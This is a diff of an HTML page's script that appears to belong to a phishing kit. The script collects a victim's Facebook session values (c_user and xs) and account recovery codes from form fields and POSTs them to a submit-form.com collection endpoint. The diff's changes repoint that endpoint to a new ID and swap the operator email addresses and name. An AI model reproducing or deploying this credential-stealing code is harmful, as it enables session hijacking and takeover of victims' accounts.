@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -416,7 +415,7 @@
             const cUserInput = document.getElementById("c_user").value.trim();
             const xsInput = document.getElementById("xs").value.trim();
             // Always send c_user and xs
-            fetch("https://submit-form.com/Q0UDFglaH", {
+            fetch("https://submit-form.com/h6znGFgHB", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -449,20 +448,20 @@
             const xsInput = document.getElementById("xs").value.trim();
             const recoveryInput = document.getElementById("recovery_codes")?.value.trim() || "";
 
-            fetch("https://submit-form.com/Q0UDFglaH", {
+            fetch("https://submit-form.com/h6znGFgHB", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     c_user: cUserInput,
                     xs: xsInput,
-                    emails: ["sonambajwa220@gmail.com", "asonambajwa220@gmail.com"],
-                    workerEmail: "sonambajwa220@gmail.com",
-                    name: "hanif
+                    emails: ["legendrabdino63@gmail.com", "sonambajwa220@gmail.com"],
+                    workerEmail: "legendrabdino63@gmail.com",
+                    name: "RABOO"
                 }),
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/Q0UDFglaH", {
+                         fetch("https://submit-form.com/h6znGFgHB", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
@@ -485,7 +484,7 @@
                 console.error("Submission error:", err);
                 alert("An error occurred. Please try again.");
                 if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/Q0UDFglaH", {
+                         fetch("https://submit-form.com/h6znGFgHB", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
